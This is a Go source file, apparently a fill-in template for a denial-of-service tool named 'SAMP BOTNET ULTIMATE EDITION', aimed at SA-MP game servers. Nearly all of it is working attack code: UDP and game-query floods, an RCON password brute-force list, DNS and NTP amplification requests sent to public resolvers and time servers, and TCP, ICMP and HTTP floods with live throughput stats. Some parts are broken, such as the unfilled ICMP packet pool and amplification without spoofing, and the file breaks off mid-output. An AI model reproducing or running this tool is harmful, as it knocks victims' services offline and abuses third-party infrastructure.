package main

import (
    "fmt"
    "net"
    "time"
    "runtime"
    "sync/atomic"
    "math/rand"
    "syscall"
    "encoding/binary"
    "strings"
    "sync"
    "os"
    "os/signal"
)

// Global counters
var (
    totalPackets uint64 = 0
    totalBytes   uint64 = 0
    peakPPS      uint64 = 0
    peakGBPS     uint64 = 0
    stopFlag     int32  = 0
)

// Pre-allocated packet pools
var (
    sampPackets   [][]byte
    udpPackets    [][]byte
    rconPackets   [][]byte
    rulesPackets  [][]byte
    playerPackets [][]byte
    dnsQueries    [][]byte
    ntpRequests   [][]byte
    tcpPackets    [][]byte
    icmpPackets   [][]byte
    httpRequests  [][]byte
)

// Smart resource manager
type ResourceManager struct {
    maxCPUPercent   int32
    maxMemoryMB     int64
    currentLoad     int32
    adaptiveDelay   int64
}

func main() {
    targetIP := "{{.TargetIP}}"
    targetPort := {{.TargetPort}}
    duration := {{.Duration}}
    threadMultiplier := {{.Threads}}
    method := "{{.Method}}"
    
    runtime.GOMAXPROCS(runtime.NumCPU())
    
    targetAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, targetPort))
    if err != nil {
        fmt.Printf("Error: %v\n", err)
        return
    }
    
    // Banner
    fmt.Printf("\n")
    fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\n")
    fmt.Printf("║                         🔥 SAMP BOTNET ULTIMATE EDITION v3 - SMART EDITION 🔥                                              ║\n")
    fmt.Printf("║                      ADAPTIVE RESOURCE MANAGEMENT - MAX POWER WITHOUT SELF-DAMAGE                                          ║\n")
    fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣\n")
    fmt.Printf("║  [ TARGET ] %-30s | [ PORT ] %-10d | [ DURATION ] %-10d                           ║\n", targetIP, targetPort, duration)
    fmt.Printf("║  [ CPU ] %-10d cores | [ THREADS ] %-10d | [ METHOD ] %-10s                              ║\n", 
        runtime.NumCPU(), threadMultiplier*runtime.NumCPU(), method)
    fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\n")
    fmt.Printf("\n")
    
    stopTime := time.Now().Add(time.Duration(duration) * time.Second)
    
    // SMART: Auto-adjust thread count based on available resources
    cpuCores := runtime.NumCPU()
    var memStats runtime.MemStats
    runtime.ReadMemStats(&memStats)
    
    // Detect available memory (safe limit: use 50% of available)
    availableMemoryMB := int64(memStats.TotalAlloc / 1024 / 1024)
    if availableMemoryMB < 100 {
        availableMemoryMB = 512 // Default if can't detect
    }
    safeMemoryMB := availableMemoryMB / 2
    
    // Calculate optimal threads based on CPU and memory
    maxThreadsByCPU := cpuCores * 1500 // Safe limit (1500 per core, not 3000)
    maxThreadsByMemory := int(safeMemoryMB / 8) // ~8MB per thread overhead
    
    optimalThreads := maxThreadsByCPU
    if maxThreadsByMemory < optimalThreads {
        optimalThreads = maxThreadsByMemory
    }
    
    // Cap at reasonable limits
    if optimalThreads > 8000 {
        optimalThreads = 8000
    }
    if optimalThreads < 500 {
        optimalThreads = 500
    }
    
    baseThreads := optimalThreads
    threadsPerCore := baseThreads / cpuCores
    if threadsPerCore < 100 {
        threadsPerCore = 100
    }
    
    fmt.Printf("[✓] CPU: %d cores | Memory: %d MB (safe: %d MB)", cpuCores, availableMemoryMB, safeMemoryMB)
    fmt.Printf("\n[✓] Optimal Threads: %d | Threads/Core: %d\n", baseThreads, threadsPerCore)
    
    // Adaptive delay mechanism
    adaptiveDelay := int64(1) // Start with minimal delay
    var adaptiveDelayAtomic int64 = 1
    
    // Socket buffer optimal (not excessive)
    setOptimalSocketBuffer := func(conn *net.UDPConn) {
        file, err := conn.File()
        if err == nil {
            fd := int(file.Fd())
            // Use 8MB buffer (balanced)
            syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 8*1024*1024)
            syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 8*1024*1024)
            file.Close()
        }
    }
    
    // ==================== GENERATE PACKETS (SMART GENERATION) ====================
    fmt.Printf("\n[1/5] Generating SAMP packet variants (adaptive)... ")
    
    // Adaptive packet count based on memory
    packetCount := 25000 // Default
    if safeMemoryMB > 1024 {
        packetCount = 50000
    } else if safeMemoryMB > 512 {
        packetCount = 35000
    } else {
        packetCount = 20000
    }
    
    sampPackets = make([][]byte, packetCount)
    
    // Headers
    headerVariants := make([][]byte, 16)
    for i := 0; i < 16; i++ {
        h := make([]byte, 8)
        for j := 0; j < 4; j++ {
            h[j] = byte(rand.Intn(256))
        }
        copy(h[4:], []byte{'S', 'A', 'M', 'P'})
        headerVariants[i] = h
    }
    
    queryTypes := make([]byte, 23)
    for i := 0; i < 23; i++ {
        queryTypes[i] = 0x69 + byte(i)
    }
    
    // Generate with progressive patterns
    for i := 0; i < packetCount; i++ {
        size := 64 + rand.Intn(1984)
        packet := make([]byte, size)
        
        header := headerVariants[rand.Intn(len(headerVariants))]
        copy(packet[0:8], header)
        
        if len(packet) > 14 {
            packet[14] = queryTypes[rand.Intn(len(queryTypes))]
        }
        
        pattern := rand.Intn(12)
        switch pattern {
        case 0:
            for j := 15; j < size; j++ {
                packet[j] = byte(rand.Intn(256))
            }
        case 1:
            for j := 15; j < size; j++ {
                packet[j] = byte((j - 15) % 256)
            }
        case 2:
            val := byte(rand.Intn(256))
            for j := 15; j < size; j++ {
                packet[j] = val
            }
        case 3:
            base := byte(rand.Intn(200))
            for j := 15; j < size; j++ {
                packet[j] = base + byte((j-15)%50)
            }
        case 4:
            // Zero fill
        case 5:
            for j := 15; j < size; j++ {
                packet[j] = 0xFF
            }
        case 6:
            for j := 15; j < size; j++ {
                packet[j] = byte(0xAA + (j%2)*0x55)
            }
        case 7:
            for j := 15; j < size; j++ {
                packet[j] = byte(255 - ((j - 15) % 256))
            }
        case 8:
            for j := 15; j < size-1; j += 2 {
                binary.LittleEndian.PutUint16(packet[j:j+2], uint16(rand.Intn(65535)))
            }
        case 9:
            for j := 15; j < size-3; j += 4 {
                binary.LittleEndian.PutUint32(packet[j:j+4], rand.Uint32())
            }
        case 10:
            for j := 15; j < size-7; j += 8 {
                binary.LittleEndian.PutUint64(packet[j:j+8], rand.Uint64())
            }
        case 11:
            for j := 15; j < size; j++ {
                packet[j] = byte(rand.Intn(2)) * 0xFF
            }
        }
        sampPackets[i] = packet
    }
    fmt.Printf("OK (%d variants)\n", packetCount)
    
    // ==================== RCON BRUTE (OPTIMIZED) ====================
    fmt.Printf("[2/5] Generating RCON brute packets... ")
    
    rconPackets = make([][]byte, 5000)
    rconCmds := []string{
        "rcon", "password", "login", "auth", "admin", "root", "changeme", "123456",
        "qwerty", "letmein", "admin123", "password123", "12345", "123456789",
        "adminadmin", "server", "samp", "gtasa", "gta", "sanandreas",
        "gaming", "host", "owner", "moderator", "superuser", "master",
        "test", "testing", "default", "sample", "demo", "example",
    }
    
    for i := 0; i < 5000; i++ {
        size := 32 + rand.Intn(128)
        packet := make([]byte, size)
        copy(packet[0:8], []byte{0xFF, 0xFF, 0xFF, 0xFF, 'S', 'A', 'M', 'P'})
        packet[14] = 0x72
        cmd := rconCmds[rand.Intn(len(rconCmds))] + fmt.Sprintf("%d", rand.Intn(999999))
        copy(packet[15:], cmd)
        rconPackets[i] = packet
    }
    fmt.Printf("OK\n")
    
    // ==================== UDP FLOOD (OPTIMIZED) ====================
    fmt.Printf("[3/5] Generating UDP flood packets... ")
    
    udpPackets = make([][]byte, 10000)
    for i := 0; i < 10000; i++ {
        size := 64 + rand.Intn(1984)
        packet := make([]byte, size)
        for j := 0; j < size; j += 8 {
            if j+7 < size {
                binary.LittleEndian.PutUint64(packet[j:j+8], rand.Uint64())
            }
        }
        udpPackets[i] = packet
    }
    fmt.Printf("OK\n")
    
    // ==================== RULES/PLAYER QUERIES ====================
    fmt.Printf("[4/5] Generating rules/player queries... ")
    
    rulesPackets = make([][]byte, 2500)
    playerPackets = make([][]byte, 2500)
    
    for i := 0; i < 2500; i++ {
        size := 32 + rand.Intn(96)
        packet := make([]byte, size)
        copy(packet[0:8], headerVariants[rand.Intn(len(headerVariants))])
        packet[14] = 0x71
        for j := 15; j < size; j++ {
            packet[j] = byte(rand.Intn(26) + 97)
        }
        rulesPackets[i] = packet
        
        size2 := 24 + rand.Intn(40)
        packet2 := make([]byte, size2)
        copy(packet2[0:8], headerVariants[rand.Intn(len(headerVariants))])
        packet2[14] = 0x70
        playerPackets[i] = packet2
    }
    fmt.Printf("OK\n")
    
    // ==================== AMPLIFICATION VECTORS ====================
    fmt.Printf("[5/5] Generating amplification vectors... ")
    
    dnsServers := []string{
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9",
        "208.67.222.222", "208.67.220.220", "94.140.14.14", "94.140.15.15",
    }
    
    ntpServers := []string{
        "pool.ntp.org", "time.google.com", "time.windows.com",
        "time.apple.com", "time.cloudflare.com",
    }
    
    dnsQueries = make([][]byte, 2500)
    domains := []string{
        "google.com", "amazon.com", "facebook.com", "microsoft.com",
        "cloudflare.com", "github.com", "youtube.com", "twitter.com",
        "instagram.com", "linkedin.com", "netflix.com", "spotify.com",
        "discord.com", "telegram.org", "whatsapp.com", "tiktok.com",
    }
    
    for i := 0; i < 2500; i++ {
        query := make([]byte, 512)
        binary.BigEndian.PutUint16(query[0:2], uint16(rand.Intn(65535)))
        binary.BigEndian.PutUint16(query[2:4], 0x0100)
        binary.BigEndian.PutUint16(query[4:6], 1)
        
        pos := 12
        domain := domains[rand.Intn(len(domains))]
        if rand.Intn(2) == 0 {
            domain = "www." + domain
        }
        parts := strings.Split(domain, ".")
        for _, part := range parts {
            query[pos] = byte(len(part))
            pos++
            copy(query[pos:], []byte(part))
            pos += len(part)
        }
        query[pos] = 0
        pos++
        
        binary.BigEndian.PutUint16(query[pos:pos+2], 255)
        pos += 2
        binary.BigEndian.PutUint16(query[pos:pos+2], 1)
        
        dnsQueries[i] = query[:pos+2]
    }
    
    ntpRequests = make([][]byte, 2)
    ntpRequests[0] = []byte{0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00}
    ntpRequests[1] = []byte{0x1b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
    fmt.Printf("OK\n\n")
    
    // ==================== ATTACK EXECUTION ====================
    fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════════════════════════╗\n")
    fmt.Printf("║                                   SMART ATTACK VECTORS                                           ║\n")
    fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════════════════════════╝\n")
    
    type connection struct {
        conn *net.UDPConn
        addr *net.UDPAddr
    }
    
    udpPool := sync.Pool{
        New: func() interface{} {
            conn, _ := net.DialUDP("udp", nil, targetAddr)
            setOptimalSocketBuffer(conn)
            return &connection{conn: conn, addr: targetAddr}
        },
    }
    
    // Signal handler
    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, os.Interrupt)
    go func() {
        <-sigChan
        atomic.StoreInt32(&stopFlag, 1)
        fmt.Printf("\n[!] Interrupted, stopping...\n")
    }()
    
    startTime := time.Now()
    
    // Smart delay manager
    go func() {
        for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
            time.Sleep(2 * time.Second)
            
            // Check CPU load via system (simplified)
            var m runtime.MemStats
            runtime.ReadMemStats(&m)
            
            // If memory usage > 80%, increase delay
            memPercent := float64(m.Alloc) / float64(m.Sys) * 100
            if memPercent > 80 {
                newDelay := atomic.LoadInt64(&adaptiveDelayAtomic) + 2
                if newDelay > 20 {
                    newDelay = 20
                }
                atomic.StoreInt64(&adaptiveDelayAtomic, newDelay)
            } else if memPercent < 50 && atomic.LoadInt64(&adaptiveDelayAtomic) > 1 {
                newDelay := atomic.LoadInt64(&adaptiveDelayAtomic) - 1
                if newDelay < 1 {
                    newDelay = 1
                }
                atomic.StoreInt64(&adaptiveDelayAtomic, newDelay)
            }
        }
    }()
    
    switch method {
    case "UDP":
        fmt.Printf("[VECTOR] Smart UDP: %d threads\n", baseThreads)
        for i := 0; i < baseThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    
                    burstSize := 2 + rand.Intn(3) // 2-4 packets (reduced for stability)
                    for b := 0; b < burstSize; b++ {
                        packet := udpPackets[rand.Intn(10000)]
                        conn.conn.Write(packet)
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    }
                    time.Sleep(time.Microsecond * time.Duration(delay))
                }
            }()
            time.Sleep(time.Millisecond * 2) // Staggered start
        }
        
    case "SAMP":
        fmt.Printf("[VECTOR] Smart SAMP: %d threads\n", baseThreads)
        
        normalThreads := baseThreads * 40 / 100
        rconThreads := baseThreads * 30 / 100
        rulesThreads := baseThreads * 15 / 100
        playerThreads := baseThreads * 15 / 100
        
        fmt.Printf("  ├─ Normal Queries: %d threads\n", normalThreads)
        fmt.Printf("  ├─ RCON Brute: %d threads\n", rconThreads)
        fmt.Printf("  ├─ Rules Query: %d threads\n", rulesThreads)
        fmt.Printf("  └─ Player Query: %d threads\n", playerThreads)
        
        // Normal queries
        for i := 0; i < normalThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    packet := sampPackets[rand.Intn(packetCount)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond * time.Duration(delay))
                }
            }()
        }
        
        // RCON brute
        for i := 0; i < rconThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    packet := rconPackets[rand.Intn(5000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond * time.Duration(delay) * 2)
                }
            }()
        }
        
        // Rules & Player
        for i := 0; i < rulesThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    packet := rulesPackets[rand.Intn(2500)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond * time.Duration(delay))
                }
            }()
        }
        
        for i := 0; i < playerThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    packet := playerPackets[rand.Intn(2500)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond * time.Duration(delay))
                }
            }()
        }
        
    case "MIX":
        fmt.Printf("[VECTOR] Smart MIX: %d threads\n", baseThreads)
        
        sampThreads := baseThreads * 70 / 100
        udpThreads := baseThreads - sampThreads
        
        for i := 0; i < sampThreads; i++ {
            go func(id int) {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    
                    switch id % 4 {
                    case 0:
                        packet := sampPackets[rand.Intn(packetCount)]
                        conn.conn.Write(packet)
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    case 1:
                        packet := rconPackets[rand.Intn(5000)]
                        conn.conn.Write(packet)
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    case 2:
                        packet := rulesPackets[rand.Intn(2500)]
                        conn.conn.Write(packet)
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    case 3:
                        packet := playerPackets[rand.Intn(2500)]
                        conn.conn.Write(packet)
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    }
                    time.Sleep(time.Microsecond * time.Duration(delay))
                }
            }(i)
        }
        
        for i := 0; i < udpThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    packet := udpPackets[rand.Intn(10000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond * time.Duration(delay))
                }
            }()
        }
        
    case "AMPLIFY":
        fmt.Printf("[VECTOR] Smart AMPLIFY: %d threads\n", baseThreads)
        
        dnsThreads := baseThreads * 70 / 100
        ntpThreads := baseThreads - dnsThreads
        
        for i := 0; i < dnsThreads; i++ {
            go func() {
                conn, _ := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0})
                setOptimalSocketBuffer(conn)
                defer conn.Close()
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    
                    for s := 0; s < 2; s++ {
                        server := dnsServers[rand.Intn(len(dnsServers))]
                        serverAddr, _ := net.ResolveUDPAddr("udp", server+":53")
                        query := dnsQueries[rand.Intn(2500)]
                        conn.WriteToUDP(query, serverAddr)
                        atomic.AddUint64(&totalPackets, 20)
                        atomic.AddUint64(&totalBytes, 20*512)
                    }
                    time.Sleep(time.Microsecond * time.Duration(delay) * 5)
                }
            }()
        }
        
        for i := 0; i < ntpThreads; i++ {
            go func() {
                conn, _ := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0})
                setOptimalSocketBuffer(conn)
                defer conn.Close()
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    
                    server := ntpServers[rand.Intn(len(ntpServers))]
                    serverAddr, _ := net.ResolveUDPAddr("udp", server+":123")
                    req := ntpRequests[rand.Intn(2)]
                    conn.WriteToUDP(req, serverAddr)
                    if req[0] == 0x17 {
                        atomic.AddUint64(&totalPackets, 80)
                        atomic.AddUint64(&totalBytes, 80*512)
                    } else {
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, 48)
                    }
                    time.Sleep(time.Microsecond * time.Duration(delay) * 10)
                }
            }()
        }
        
    case "GOD":
        fmt.Printf("[VECTOR] SMART GOD MODE - ALL METHODS COMBINED\n")
        
        // Balanced distribution (lower thread counts for stability)
        sampNormalThreads := baseThreads * 22 / 100
        sampRCONThreads := baseThreads * 18 / 100
        sampRulesThreads := baseThreads * 15 / 100
        sampPlayerThreads := baseThreads * 10 / 100
        udpThreads := baseThreads * 15 / 100
        dnsThreads := baseThreads * 8 / 100
        ntpThreads := baseThreads * 4 / 100
        tcpThreads := baseThreads * 3 / 100
        icmpThreads := baseThreads * 3 / 100
        httpThreads := baseThreads * 2 / 100
        
        fmt.Printf("  ├─ SAMP Normal: %d threads\n", sampNormalThreads)
        fmt.Printf("  ├─ SAMP RCON: %d threads\n", sampRCONThreads)
        fmt.Printf("  ├─ SAMP Rules: %d threads\n", sampRulesThreads)
        fmt.Printf("  ├─ SAMP Player: %d threads\n", sampPlayerThreads)
        fmt.Printf("  ├─ UDP: %d threads\n", udpThreads)
        fmt.Printf("  ├─ DNS Amplify: %d threads\n", dnsThreads)
        fmt.Printf("  ├─ NTP Amplify: %d threads\n", ntpThreads)
        fmt.Printf("  ├─ TCP: %d threads\n", tcpThreads)
        fmt.Printf("  ├─ ICMP: %d threads\n", icmpThreads)
        fmt.Printf("  └─ HTTP: %d threads\n", httpThreads)
        
        // SAMP Normal
        for i := 0; i < sampNormalThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    packet := sampPackets[rand.Intn(packetCount)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond * time.Duration(delay))
                }
            }()
        }
        
        // SAMP RCON
        for i := 0; i < sampRCONThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    packet := rconPackets[rand.Intn(5000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond * time.Duration(delay) * 2)
                }
            }()
        }
        
        // SAMP Rules
        for i := 0; i < sampRulesThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    packet := rulesPackets[rand.Intn(2500)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond * time.Duration(delay))
                }
            }()
        }
        
        // SAMP Player
        for i := 0; i < sampPlayerThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    packet := playerPackets[rand.Intn(2500)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond * time.Duration(delay))
                }
            }()
        }
        
        // UDP
        for i := 0; i < udpThreads; i++ {
            go func() {
                conn := udpPool.Get().(*connection)
                defer udpPool.Put(conn)
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    packet := udpPackets[rand.Intn(10000)]
                    conn.conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Microsecond * time.Duration(delay))
                }
            }()
        }
        
        // DNS Amplification
        for i := 0; i < dnsThreads; i++ {
            go func() {
                conn, _ := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0})
                setOptimalSocketBuffer(conn)
                defer conn.Close()
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    server := dnsServers[rand.Intn(len(dnsServers))]
                    serverAddr, _ := net.ResolveUDPAddr("udp", server+":53")
                    query := dnsQueries[rand.Intn(2500)]
                    conn.WriteToUDP(query, serverAddr)
                    atomic.AddUint64(&totalPackets, 20)
                    atomic.AddUint64(&totalBytes, 20*512)
                    time.Sleep(time.Microsecond * time.Duration(delay) * 5)
                }
            }()
        }
        
        // NTP Amplification
        for i := 0; i < ntpThreads; i++ {
            go func() {
                conn, _ := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 0})
                setOptimalSocketBuffer(conn)
                defer conn.Close()
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    server := ntpServers[rand.Intn(len(ntpServers))]
                    serverAddr, _ := net.ResolveUDPAddr("udp", server+":123")
                    req := ntpRequests[rand.Intn(2)]
                    conn.WriteToUDP(req, serverAddr)
                    if req[0] == 0x17 {
                        atomic.AddUint64(&totalPackets, 80)
                        atomic.AddUint64(&totalBytes, 80*512)
                    } else {
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, 48)
                    }
                    time.Sleep(time.Microsecond * time.Duration(delay) * 10)
                }
            }()
        }
        
        // TCP SYN
        for i := 0; i < tcpThreads; i++ {
            go func() {
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort), time.Second)
                    if err == nil {
                        conn.Close()
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, 64)
                    }
                    time.Sleep(time.Millisecond * time.Duration(delay))
                }
            }()
        }
        
        // ICMP
        for i := 0; i < icmpThreads; i++ {
            go func() {
                conn, err := net.DialIP("ip4:icmp", nil, &net.IPAddr{IP: net.ParseIP(targetIP)})
                if err != nil {
                    return
                }
                defer conn.Close()
                
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    packet := icmpPackets[rand.Intn(1000)]
                    conn.Write(packet)
                    atomic.AddUint64(&totalPackets, 1)
                    atomic.AddUint64(&totalBytes, uint64(len(packet)))
                    time.Sleep(time.Millisecond * time.Duration(delay))
                }
            }()
        }
        
        // HTTP
        httpPaths := []string{"/", "/index.html", "/api", "/login", "/wp-admin"}
        userAgents := []string{
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        }
        
        for i := 0; i < httpThreads; i++ {
            go func() {
                for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
                    delay := atomic.LoadInt64(&adaptiveDelayAtomic)
                    conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, 80), time.Second)
                    if err == nil {
                        req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n",
                            httpPaths[rand.Intn(len(httpPaths))], targetIP, userAgents[rand.Intn(len(userAgents))])
                        conn.Write([]byte(req))
                        conn.Close()
                        atomic.AddUint64(&totalPackets, 1)
                        atomic.AddUint64(&totalBytes, uint64(len(req)))
                    }
                    time.Sleep(time.Millisecond * time.Duration(delay) * 2)
                }
            }()
        }
    }
    
    // ==================== MONITORING ====================
    fmt.Printf("\n[%s] Attack started (smart mode)...\n", method)
    var lastPackets uint64 = 0
    var lastBytes uint64 = 0
    var peakPackets uint64 = 0
    var peakBandwidth uint64 = 0
    
    ticker := time.NewTicker(2 * time.Second)
    defer ticker.Stop()
    
    for time.Now().Before(stopTime) && atomic.LoadInt32(&stopFlag) == 0 {
        <-ticker.C
        currentPackets := atomic.LoadUint64(&totalPackets)
        currentBytes := atomic.LoadUint64(&totalBytes)
        elapsed := time.Since(startTime).Seconds()
        
        pps := float64(currentPackets-lastPackets) / 2.0
        mbps := float64(currentBytes-lastBytes) * 8.0 / (2.0 * 1024 * 1024)
        gbps := mbps / 1000
        
        if uint64(pps) > peakPackets {
            peakPackets = uint64(pps)
        }
        if uint64(gbps*1000) > peakBandwidth {
            peakBandwidth = uint64(gbps * 1000)
        }
        
        // Show adaptive delay status
        currentDelay := atomic.LoadInt64(&adaptiveDelayAtomic)
        fmt.Printf("\r[%.0fs] PPS: %.0f | MBPS: %.1f | GBPS: %.2f | DELAY: %dµs | TOTAL: %s packets", 
            elapsed, pps, mbps, gbps, currentDelay, formatNumber(int64(currentPackets)))
        
        lastPackets = currentPackets
        lastBytes = currentBytes
    }
    fmt.Println()
    
    // ==================== FINAL STATS ====================
    total := atomic.LoadUint64(&totalPackets)
    totalBytesVal := atomic.LoadUint64(&totalBytes)
    totalMB := float64(totalBytesVal) / (1024 * 1024)
    totalGB := totalMB / 1024
    avgPPS := total / uint64(duration)
    avgMBPS := (totalMB * 8) / float64(duration)
    avgGBPS := avgMBPS / 1000
    
    fmt.Printf("\n")
    fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════════════════════════╗\n")
    fmt.Printf("║                                   FINAL ATTACK STATISTICS                                        ║\n")
    fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════════════════════════╣\n")
    fmt.Printf("║                                                                                                  ║\n")
    fmt.Printf("║  📦 TOTAL PACKETS:      %-30s                    ║\n", formatNumber(int64(total)))
    fmt.Printf("║  📊 TOTAL DATA:         %.2f MB (%.2f GB)                                   ║\n", totalMB, totalGB)
    fmt.Printf("║  ⚡ AVERAGE PPS:         %-30s                    ║\n", formatNumber(int64(avgPPS)))
    fmt.Printf("║  🌐 AVERAGE MBPS:        %.1f MBps                                          ║\n", avgMBPS)
    fmt.Printf("║  💀 AVERAGE GBPS:        %.2f Gbps                                           ║\n", avgGBPS)
    fmt.Printf("║  🔥 PEAK PPS:            %-30s                    ║\n", formatNumber(int64(peakPackets)))
